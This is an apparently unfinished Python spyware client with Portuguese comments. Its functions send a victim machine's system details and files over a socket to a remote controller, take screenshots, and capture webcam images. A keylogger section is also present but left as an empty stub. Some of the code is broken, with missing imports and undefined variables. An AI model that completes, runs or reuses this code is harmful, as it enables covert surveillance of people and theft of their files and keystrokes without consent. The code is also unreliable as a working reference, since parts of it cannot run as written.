import socket, platform, os
from pynput.keyboard import Key, Listener
import pygame

# ========= FUNCOES DE DESCOBERTA =========

def detalhes_da_maquina(cliente):
    mensagem = "\nSistema: {}\nNó: {}\nRelease: {}\nVersão: {}\nBits do processador: {}".format(platform.system(),
    platform.node(),platform.release(),platform.version(),platform.processor())
    cliente.send(mensagem.encode())

def detalhes_do_python(cliente):
    mensagem = "\nVersao: {}\n Versao Tuple: {} \nCompilador: {} Build: {}".format(platform.python_version(),
    platform.python_version_tuple(),
    platform.python_compiler(),
    platform.python_build())
    cliente.send(mensagem.encode())

# ========= FUNCOES DO KEYLOGGER =========

def keylogger(cliente):
    possibilidades = ['a','b','c','d','e','f','g']

def screenshot(cliente):
    fig = pyautogui.screenshot(r)
    fig.save(r'fig.png')

def webcam():
    pygame.init()
    pygame.camera.init()
    webcam = pygame.camera.Camera("/dev/video0", (800,600))
    i = 0
    while i < 15:
        webcam.start()
        imagem = webcam.get_image()
        webcam.stop()
        save = time.strftime("%d-%m-%Y_%H%M%S", time.localtime())
        file = "registros/{}.jpg".format(save)
        pygame.image.save(imagem, file)
        i += 1

def enviar_arquivo(cliente,dir):
    arquivo = open(dir, "rb")
    data = arquivo.read(1024)
    while data:
        cliente.send(data)
        data = arquivo.read(1024)
    arquivo.close()
    cliente.send(b"OK")

def comando_nao_reconhecido(cliente):
    mensagem = "\nComando nao reconhecido no sistema, tente novamente"
    cliente.send(mensagem.encode())
